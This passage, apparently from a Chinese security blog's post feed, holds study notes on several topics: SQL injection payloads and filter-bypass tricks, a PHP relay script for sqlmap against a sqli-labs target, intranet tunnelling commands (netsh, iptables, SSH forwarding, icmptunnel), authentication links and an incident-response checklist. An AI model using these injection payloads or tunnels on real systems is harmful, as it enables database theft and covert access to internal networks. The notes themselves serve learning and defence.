class="line">print_r($output);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>sqlmap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http://127.0.0.1/shell.php?&amp;daxxtae=null&amp;param=xxx&quot; --batch --delay=1 --random-agent --dbs</span><br></pre></td></tr></table></figure>

<h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;http://192.168.1.104/sqli/Less-11/index.php&quot;;</span><br><span class="line">$sql = $_GET[s];//获取中转脚本传过来的payload </span><br><span class="line">$s = urlencode($sql);</span><br><span class="line">$params = &quot;uname=admin$s&amp;passwd=aa&quot;;</span><br><span class="line">$ch = curl_init();// 创建一个新cURL资源</span><br><span class="line"> curl_setopt($ch, CURLOPT_URL, $url);//这是你想用PHP取回的URL地址，可以在用curl_init()函数初始化时设置这个选项</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);//https请求 不验证hosts</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // 函数执行如果成功只将结果返回，不自动输出任何内容。如果失败返回FALSE</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);//如果你想把一个头包含在输出中，设置这个选项为一个非零值   </span><br><span class="line">curl_setopt($ch, CURLOPT_USERAGENT, &#x27;Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)&#x27;);// 在HTTP请求中自定义一个”user-agent”头的字符串</span><br><span class="line">curl_setopt($ch, CURLOPT_TIMEOUT, 15);//为了应对目标服务器的过载，下线，或者崩溃等可能状况。</span><br><span class="line">curl_setopt($ch, CURLOPT_POST, 1);    // post 提交方式</span><br><span class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, $params);</span><br><span class="line">// 抓取URL并把它传递给浏览器 </span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">// 关闭cURL资源，并且释放系统资源</span><br><span class="line">curl_close($ch);</span><br><span class="line">$a = strlen($output);</span><br><span class="line">//echo $a;</span><br><span class="line">if($a==2846)&#123;</span><br><span class="line">    echo &quot;1&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;2&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sqlmap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sqlmap -u &quot;http://127.0.0.1/shell.php?s=1&quot; --dbs</span><br></pre></td></tr></table></figure>

<h1 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order-by注入"></a>order-by注入</h1><h2 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h2><p>regexp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?order=(select 1 regexp if(1=1,1,0x00)) 正常</span><br><span class="line">?order=(select 1 regexp if(1=2,1,0x00)) 错误</span><br></pre></td></tr></table></figure>
<p>updatexml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?order=updatexml(1,if(1=1,1,user()),1)  正常</span><br><span class="line">?order=updatexml(1,if(1=2,1,user()),1)  错误</span><br></pre></td></tr></table></figure>
<p>extractvalue</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?order=extractvalue(1,if(1=1,1,user())) 正常</span><br><span class="line">?order=extractvalue(1,if(1=2,1,user())) 错误</span><br></pre></td></tr></table></figure>
<h2 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) 正常响应时间</span><br><span class="line">/?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) sleep 2秒</span><br></pre></td></tr></table></figure>

<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="绕过-1"><a href="#绕过-1" class="headerlink" title="&#x3D;绕过"></a>&#x3D;绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like</span><br><span class="line">&lt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
<h2 id="and-or绕过"><a href="#and-or绕过" class="headerlink" title="and or绕过"></a>and or绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and=&amp;&amp;</span><br><span class="line">or=||</span><br></pre></td></tr></table></figure>
<h2 id="比较符绕过"><a href="#比较符绕过" class="headerlink" title="比较符绕过"></a>比较符绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</span><br><span class="line">此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值。</span><br><span class="line">那么上面的这条sql语句可以使用greatest变为如下的子句:</span><br><span class="line">select * from users where id = 1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br></pre></td></tr></table></figure>

<h2 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单行注释</span><br><span class="line">--+</span><br><span class="line">--空</span><br><span class="line">#</span><br><span class="line">多行注释</span><br><span class="line">/*多行注释内容*/</span><br><span class="line">若皆被过滤可尝试构造闭合，如</span><br><span class="line">?id=1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
<h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在sql注入中+可以替代空格，如</span><br><span class="line">?id=1&#x27;+or+&#x27;1&#x27;=&#x27;1</span><br><span class="line">使用注释符</span><br><span class="line">?id=1&#x27;/**/or/**/&#x27;1&#x27;=&#x27;1</span><br><span class="line">括号绕过</span><br><span class="line">?id=1&#x27;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#x27;emails&#x27;)),0x7e),1))||&#x27;1</span><br></pre></td></tr></table></figure>
<h2 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">join</span><br><span class="line">union select 1,2,3;</span><br><span class="line">union select * from ((select 1)A join (select 2)B join (select 3)C）;</span><br><span class="line">union select * from ((select 1)A join (select 2)B join (select group_concat(user(),&#x27; &#x27;,database(),&#x27; &#x27;,@@datadir))C);</span><br><span class="line"></span><br><span class="line">from for</span><br><span class="line">select substr(database(0 from 1 for 1)</span><br><span class="line">select mid(database(0 from 1 for 1)</span><br><span class="line"></span><br><span class="line">limit的 from或offset</span><br><span class="line">select * from news limit 0,1</span><br><span class="line">等价于</span><br><span class="line">select * from news limit 1 offset 0</span><br></pre></td></tr></table></figure>

<h2 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">十六进制</span><br><span class="line">mysql数据库对十六进制可直接读取</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.tables where table_name=&quot;users&quot;</span><br><span class="line">user十六进制为0x7573657273</span><br><span class="line">selectcolumn_namefrominformation_schema.tableswheretable_name=0x7573657273</span><br></pre></td></tr></table></figure>
<h2 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">大小写</span><br><span class="line">/**/截断</span><br><span class="line">双写</span><br><span class="line">url编码</span><br></pre></td></tr></table></figure>




]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>sql-inject</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs靶场练习</title>
    <url>/posts/d642dfa0.html</url>
    <content><![CDATA[<p>虽然之前通关过一次但已历史久远，未来如果有机会再来一次的话我一定截图</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>sql-inject</tag>
      </tags>
  </entry>
  <entry>
    <title>web认证机制与攻击方式</title>
    <url>/posts/65c9aba7.html</url>
    <content><![CDATA[<p><a href="https://websec.readthedocs.io/zh/latest/auth/index.html">https://websec.readthedocs.io/zh/latest/auth/index.html</a></p>
<h1 id="http-basic-auth-http-基础授权-早期"><a href="#http-basic-auth-http-基础授权-早期" class="headerlink" title="http basic auth (http 基础授权 早期)"></a>http basic auth (http 基础授权 早期)</h1><p>访问url请求头需包含用户名和密码<br>若未收到http basic auth 返回401，并返回basic值的请求头www-authenticate及参数realm<br>如apache后台访问会跳一个要求输入账密的弹窗，抓包发现请求头的authentication: basic 一串密文，这串密文为base64加密<br>摘: <a href="https://fastapi.tiangolo.com/zh/advanced/security/http-basic-auth/#_4">https://fastapi.tiangolo.com/zh/advanced/security/http-basic-auth/#_4</a></p>
<h1 id="MFA-Multi-Factor-Authentication-多因子认证"><a href="#MFA-Multi-Factor-Authentication-多因子认证" class="headerlink" title="MFA (Multi-Factor Authentication 多因子认证)"></a>MFA (Multi-Factor Authentication 多因子认证)</h1><p>即多种方式对用户身份进行验证。<br>在web端的多因子认证能大大提高系统安全，但在部分系统中，不同因子的认证可能互不相关，或因为代码逻辑缺陷导致存在漏洞。<br>摘: <a href="https://web-sec.gitbook.io/wsa/server-side/authentication/multi-factor">https://web-sec.gitbook.io/wsa/server-side/authentication/multi-factor</a></p>
<h1 id="SSO-Single-Sign-On"><a href="#SSO-Single-Sign-On" class="headerlink" title="SSO (Single Sign On)"></a>SSO (Single Sign On)</h1><p>一个用户可以通过单一的ID和凭证（密码）访问多个相关但彼此独立的系统<br>摘: <a href="https://xz.aliyun.com/t/13848?u_atoken=d49d5dca49ffa2ce7464a3d509241079&u_asig=1a0c399a17276105611338740e012d">https://xz.aliyun.com/t/13848?u_atoken=d49d5dca49ffa2ce7464a3d509241079&amp;u_asig=1a0c399a17276105611338740e012d</a></p>
<h1 id="JWT令牌-Json-Web-Token"><a href="#JWT令牌-Json-Web-Token" class="headerlink" title="JWT令牌 (Json Web Token)"></a>JWT令牌 (Json Web Token)</h1><p>常用于分布式站点的SSO场景<br>摘: <a href="https://www.v0n.top/2019/11/01/%E6%B5%85%E8%B0%88JWT%E7%BB%95%E8%BF%87/">https://www.v0n.top/2019/11/01/%E6%B5%85%E8%B0%88JWT%E7%BB%95%E8%BF%87/</a></p>
<h1 id="Oauth2"><a href="#Oauth2" class="headerlink" title="Oauth2"></a>Oauth2</h1><p>OAuth2.0 是一个被广泛使用的授权框架。能满足网站和WEB程序对另一个应用程序上用户账户数据的有限访问。允许用户在不公开登陆账号密码等凭据的情况下，授权第三方访问权限，实现不同应用间的账户认证。<br>摘: <a href="https://xz.aliyun.com/t/13349?u_atoken=90475d2a0b9fa049a3c8a0e2e2aaeb7e&u_asig=1a0c384b17276185334966303e0049">https://xz.aliyun.com/t/13349?u_atoken=90475d2a0b9fa049a3c8a0e2e2aaeb7e&amp;u_asig=1a0c384b17276185334966303e0049</a></p>
<h1 id="SAML-Security-Assertion-Markup-Language-安全断言标记语言"><a href="#SAML-Security-Assertion-Markup-Language-安全断言标记语言" class="headerlink" title="SAML (Security Assertion Markup Language 安全断言标记语言)"></a>SAML (Security Assertion Markup Language 安全断言标记语言)</h1><p>XML格式的语言，使用XML格式交互，来完成SSO的功能<br>摘: <a href="https://www.freebuf.com/articles/system/361055">https://www.freebuf.com/articles/system/361055</a>.<br>(小声逼逼: 最近Gitlab有这个洞，exp未公开)</p>
<h1 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h1><p>内网渗透避不开的认证<br>摘: <a href="https://xz.aliyun.com/t/14534">https://xz.aliyun.com/t/14534</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>认证机制与攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>内网隧道搭建</title>
    <url>/posts/d57d5540.html</url>
    <content><![CDATA[<h1 id="网络连通性测试"><a href="#网络连通性测试" class="headerlink" title="网络连通性测试"></a>网络连通性测试</h1><h2 id="icmp探测"><a href="#icmp探测" class="headerlink" title="icmp探测"></a>icmp探测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 114.114.114.114 -n 1	#Windows</span><br><span class="line">ping 114.114.114.114 -c 1	#Linux</span><br></pre></td></tr></table></figure>
<h2 id="http探测"><a href="#http探测" class="headerlink" title="http探测"></a>http探测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://www.baidu.com</span><br></pre></td></tr></table></figure>
<h2 id="dns探测"><a href="#dns探测" class="headerlink" title="dns探测"></a>dns探测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup baidu.com</span><br></pre></td></tr></table></figure>
<h1 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h1><p>服务器可出网<br>反向代理可穿透防火墙<br>cobaltstrike socks代理<br>nps工具</p>
<h1 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h1><h2 id="windows-netsh-端口转发-双网卡"><a href="#windows-netsh-端口转发-双网卡" class="headerlink" title="windows netsh 端口转发 双网卡"></a>windows netsh 端口转发 双网卡</h2><p>netsh仅支持tcp协议，适用于双网卡服务器<br>启动转发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看已有规则</span><br><span class="line">netsh interface portproxy show all</span><br><span class="line">添加转发规则 访问外网ip1234端口即访问内网ip端口3389</span><br><span class="line">netsh interface portproxy set v4tov4 listenaddress=外网IP listenport=1234 connectaddress=内网IP connectport=3389 </span><br></pre></td></tr></table></figure>
<p>取消转发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">删除转发规则</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=1234</span><br><span class="line"></span><br><span class="line"># xp需安装ipv4</span><br><span class="line">netsh interface ipv6 install</span><br></pre></td></tr></table></figure>
<h2 id="linux-iptables-转发-高权限"><a href="#linux-iptables-转发-高权限" class="headerlink" title="linux iptables 转发 高权限"></a>linux iptables 转发 高权限</h2><p>编辑配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开启IP转发</span><br><span class="line">vi /etc/sysctl.conf</span><br><span class="line">	net.ipv4.ip_forward = 1</span><br></pre></td></tr></table></figure>
<p>关闭服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service iptables stop</span><br></pre></td></tr></table></figure>
<p>配置规则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#需要访问的内网地址：10.1.1.11（Windows）</span><br><span class="line">#内网边界web服务器：192.168.100.100（Linux）</span><br><span class="line">iptables -t nat -A PREROUTING --dst 192.168.100.100 -p tcp --dport 3389 -j DNAT--to-destination 10.1.1.11:3389</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING --dst 10.1.1.11 -p tcp --dport 3389 -j SNAT --to-source 192.168.100.100</span><br></pre></td></tr></table></figure>
<p>保存并重启服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service iptables save &amp;&amp; service iptables start</span><br></pre></td></tr></table></figure>
<h2 id="neo-regeorg端口复用"><a href="#neo-regeorg端口复用" class="headerlink" title="neo-regeorg端口复用"></a>neo-regeorg端口复用</h2><p>下载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/L-codes/Neo-reGeorg</span><br></pre></td></tr></table></figure>
<h1 id="linux-ssh隧道-高权限"><a href="#linux-ssh隧道-高权限" class="headerlink" title="linux ssh隧道 高权限"></a>linux ssh隧道 高权限</h1><h2 id="本地转发-正向"><a href="#本地转发-正向" class="headerlink" title="本地转发 正向"></a>本地转发 正向</h2><p>vps执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -L &lt;VPS监听端口&gt;:&lt;目标内网IP&gt;:&lt;目标端口&gt; &lt;（root@目标外网Web服务器，会要求输入密码）&gt;</span><br><span class="line"></span><br><span class="line">ssh -CfNg -L 8080:10.1.1.3:3389 root@100.100.1.100</span><br><span class="line"></span><br><span class="line">#VPS上查看8090端口是否已经连接</span><br><span class="line">netstat -tulnp | grep &quot;8090&quot;</span><br><span class="line"></span><br><span class="line">#连接目标内网服务器的远程桌面</span><br><span class="line">VPS-IP:8090</span><br></pre></td></tr></table></figure>
<h2 id="远程转发-反向"><a href="#远程转发-反向" class="headerlink" title="远程转发 反向"></a>远程转发 反向</h2><p>web服务器执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -R &lt;VPS的端口&gt;:&lt;目标内网IP&gt;:&lt;目标端口&gt; &lt;（root@VPS-IP，会要求输入密码）&gt;</span><br><span class="line"></span><br><span class="line">ssh -CfNg -R 8090:10.1.1.3:3389 root@192.168.0.1</span><br></pre></td></tr></table></figure>
<h1 id="icmp加密隧道"><a href="#icmp加密隧道" class="headerlink" title="icmp加密隧道"></a>icmp加密隧道</h1><p>icmp可出网</p>
<p>linux: icmptunnel<br>服务端安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/jamesbarlow/icmptunnel.git</span><br><span class="line">cd icmptunnel/</span><br><span class="line">make</span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1	#禁用自带的ICMP，两端都要</span><br><span class="line">./icmptunnel -s 							#服务端以root用户监听</span><br><span class="line">(ctrl-z)									</span><br><span class="line">bg											#后台挂起</span><br><span class="line">ifconfig tun0 10.0.0.1 netmask 255.255.255.0#给隧道接口分配一个 IP 地址</span><br></pre></td></tr></table></figure>
<p>客户端连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./icmptunnel &lt;server-IP&gt;</span><br><span class="line">(ctrl-z)</span><br><span class="line">bg											#后台挂起</span><br><span class="line">ifconfig tun0 10.0.0.2 netmask 255.255.255.0#给隧道接口分配一个 IP 地址</span><br></pre></td></tr></table></figure>
<p>测试ssh连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@10.0.0.1</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Intranet安全</category>
      </categories>
      <tags>
        <tag>内网穿透</tag>
      </tags>
  </entry>
  <entry>
    <title>xxe漏洞及原理</title>
    <url>/posts/e69865a1.html</url>
    <content><![CDATA[<p>这个洞总是学了又忘，第四次了。<br>摘: <a href="https://blog.csdn.net/elephantxiang/article/details/113812331">pikachu XXE (XML外部实体注入)（皮卡丘漏洞平台通关系列）_仙女象的博客-CSDN博客</a><br>摘: <a href="https://lalajun.github.io/2019/12/03/WEB-XXE/">WEB-XXE (lalajun.github.io)</a><br>摘: <a href="https://www.freebuf.com/articles/web/177979.html">XXE漏洞利用技巧：从XML到远程代码执行</a><br>摘: <a href="dtd%EF%BC%88%E5%85%83%E7%B4%A0%E5%AE%9A%E4%B9%89%E5%92%8C%E5%B1%9E%E6%80%A7%E5%AE%9A%E4%B9%89%EF%BC%89">https://blog.csdn.net/m0_54546762&#x2F;article&#x2F;details&#x2F;119181068#:~:text&#x3D;二 、元素定义 1引入DTD约束 <!DOCTYPE ROOT []> 2添加元素定义 &lt;!ELEMENT,<!ELEMENT element-name (#PCDATA)> (文本元素) <!ELEMENT element-name (e1,e2)> (混合元素)</a></p>
]]></content>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>应急响应知识记录</title>
    <url>/posts/dbfe99cc.html</url>
    <content><![CDATA[<p>仅作简单应急响应流程</p>
<h1 id="确认事件类型"><a href="#确认事件类型" class="headerlink" title="确认事件类型"></a>确认事件类型</h1><h2 id="恶意程序"><a href="#恶意程序" class="headerlink" title="恶意程序"></a>恶意程序</h2><p>计算机病毒、特洛伊木马 、勒索软件、蠕虫病毒、僵尸网络程序、挖矿程序等</p>
<h2 id="网络攻击"><a href="#网络攻击" class="headerlink" title="网络攻击"></a>网络攻击</h2><p>拒绝服务攻击、漏洞攻击、网络钓鱼、后门攻击、网络扫描窃听等</p>
<h2 id="Web攻击"><a href="#Web攻击" class="headerlink" title="Web攻击"></a>Web攻击</h2><p>WebShell、网页挂马、网页篡改、网页暗链、sql注入等</p>
<h1 id="windows-排查"><a href="#windows-排查" class="headerlink" title="windows 排查"></a>windows 排查</h1><h2 id="账号排查"><a href="#账号排查" class="headerlink" title="账号排查"></a>账号排查</h2><p>查看服务器是否有弱口令，远程管理端口（rdp，ssh，redis，ftp等）是否对公网开放</p>
<h2 id="隐藏账户排查"><a href="#隐藏账户排查" class="headerlink" title="隐藏账户排查"></a>隐藏账户排查</h2><p>注册表 local_machine，sam，domains，account，users。<br>names记录用户名称<br>若sam无法打开则赋予注册表管理员权限并需要重新启动注册表</p>
<h2 id="日志排查"><a href="#日志排查" class="headerlink" title="日志排查"></a>日志排查</h2><h3 id="IIS日志排查"><a href="#IIS日志排查" class="headerlink" title="IIS日志排查"></a>IIS日志排查</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:\\windows\system32\winevt\logs\</span><br></pre></td></tr></table></figure>
<p>eventvwr.msc，windows日志，应用程序日志&#x2F;安全日志&#x2F;系统日志。<br>应用程序日志记录应用程序运行过程中的事件和错误信息<br>安全日志4624登录成功，4625登录失败<br>系统日志记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等<br>工具: Log Parser</p>
<h3 id="web中间件日志排查"><a href="#web中间件日志排查" class="headerlink" title="web中间件日志排查"></a>web中间件日志排查</h3><p>根据中间件查找对应日志<br>apache</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows: Apache安装目录/logslaccess.logerror.logL</span><br><span class="line">Linux:/usr/local/apache/logs/access logerror log</span><br></pre></td></tr></table></figure>
<p>tomcat</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tomcat安装目录/log/access.log</span><br></pre></td></tr></table></figure>
<p>nginx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx安装目录/mginx/access.log</span><br></pre></td></tr></table></figure>
<p>weblogic</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统日志: Jboss安装目录/server/default/log下</span><br><span class="line">系统启动日志: boot.log</span><br><span class="line">系统当天日志: server.log</span><br><span class="line">历史日志: server..log.日期</span><br><span class="line">记录jboss访问日志: access_log</span><br></pre></td></tr></table></figure>
<p>工具: EmEditor</p>
<h2 id="异常端口进程排查"><a href="#异常端口进程排查" class="headerlink" title="异常端口进程排查"></a>异常端口进程排查</h2><h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano 查看可疑 ESTABLISHED 连接状态的PID</span><br><span class="line">tasklist | findstr PID 根据可疑进程PID查找进程</span><br></pre></td></tr></table></figure>
<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>msinfo 查看进程详细信息，进程路径&#x2F;PID&#x2F;创建日期&#x2F;启动时间<br>通过进程查看工具查找可疑子进程<br>没有签名验证信息的进程<br>没有描述信息的进程<br>进程的属主<br>进程的路径是否合法<br>CPU 或内存资源占用长时间过高的进程<br>查杀工具：D盾<br>进程查看工具：process explorer</p>
<h2 id="启动项-计划任务-服务"><a href="#启动项-计划任务-服务" class="headerlink" title="启动项&#x2F;计划任务&#x2F;服务"></a>启动项&#x2F;计划任务&#x2F;服务</h2><h3 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h3><p>查看【启动】文件夹<br>msconfig查看启动<br>注册表开机启动项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure>
<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">at win10已弃用</span><br><span class="line">schtasks</span><br></pre></td></tr></table></figure>
<h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><p>service.msc检查是否存在可疑自启动服务</p>
<h1 id="linux-排查"><a href="#linux-排查" class="headerlink" title="linux 排查"></a>linux 排查</h1><h2 id="账户排查"><a href="#账户排查" class="headerlink" title="账户排查"></a>账户排查</h2><p>who     查看当前登录用户（tty 本地登陆  pts 远程登录）<br>w       查看系统信息，某一时刻用户的行为<br>uptime  查看登陆多久、多少用户，负载状态</p>
<h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><p>etc&#x2F;passwd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明：家目录：登陆后的 shell</span><br></pre></td></tr></table></figure>
<h3 id="密码信息"><a href="#密码信息" class="headerlink" title="密码信息"></a>密码信息</h3><p>etc&#x2F;shadow</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br></pre></td></tr></table></figure>
<h2 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h2><p>history 命令或 .bash_history 文件查看<br>进入用户目录下导出历史命令<br>cat .bash_history &gt;&gt; history.txt</p>
<h2 id="异常端口-进程"><a href="#异常端口-进程" class="headerlink" title="异常端口&#x2F;进程"></a>异常端口&#x2F;进程</h2><h3 id="端口-1"><a href="#端口-1" class="headerlink" title="端口"></a>端口</h3><p>查看异常网络连接的PID<br>netstat -antlp</p>
<h3 id="进程-1"><a href="#进程-1" class="headerlink" title="进程"></a>进程</h3><p>对应进程文件路径<br>ls -l &#x2F;proc&#x2F;$PID&#x2F;exe 或 file &#x2F;proc&#x2F;$PID&#x2F;exe<br>分析进程<br>ps aux | grep PID</p>
<h2 id="开机启动项-定时任务"><a href="#开机启动项-定时任务" class="headerlink" title="开机启动项&#x2F;定时任务"></a>开机启动项&#x2F;定时任务</h2><h3 id="启动项-1"><a href="#启动项-1" class="headerlink" title="启动项"></a>启动项</h3><p>开启启动等级rc*.d<br>默认级别为rc3.d<br>可疑脚本<br>&#x2F;etc&#x2F;init.d<br>软链接<br>&#x2F;etc&#x2F;rc.d&#x2F;rc*.d</p>
<table>
<thead>
<tr>
<th align="center">运行级别</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0</td>
<td align="center">关机</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">单用户模式，可以想象为windows的安全模式，主要用于系统修复</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">不完全的命令行模式，不含NFS服务</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">完全的命令行模式，就是标准字符界面</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">系统保留</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">图形模式</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">重启动</td>
</tr>
</tbody></table>
<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -l   列出某个用户cron服务的详细内容</span><br><span class="line">Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/rootcrontab -r</span><br><span class="line">删除每个用户cront任务(谨慎：删除所有的计划任务)</span><br><span class="line">crontab -e   使用编辑器编辑当前的crontab文件 </span><br></pre></td></tr></table></figure>
<h2 id="恶意脚本排查"><a href="#恶意脚本排查" class="headerlink" title="恶意脚本排查"></a>恶意脚本排查</h2><p>more &#x2F;etc&#x2F;cron.d&#x2F;* 查看目录下所有文件<br>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;*<br>&#x2F;etc&#x2F;crontab<br>&#x2F;etc&#x2F;cron.d&#x2F;*<br>&#x2F;etc&#x2F;cron.daily&#x2F;*<br>&#x2F;etc&#x2F;cron.hourly&#x2F;*<br>&#x2F;etc&#x2F;cron.monthly&#x2F;*<br>&#x2F;etc&#x2F;cron.weekly&#x2F;<br>&#x2F;etc&#x2F;anacrontab<br>&#x2F;var&#x2F;spool&#x2F;anacron&#x2F;*</p>
<h2 id="异常文件"><a href="#异常文件" class="headerlink" title="异常文件"></a>异常文件</h2><p>1、查看敏感目录，注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性，可使用ls -l查看<br>2、查找webshell同一时间范围内创建的文件<br>find &#x2F;opt -iname “*” -atime 1 -type f 找出 &#x2F;opt 下一天前访问过的文件</p>
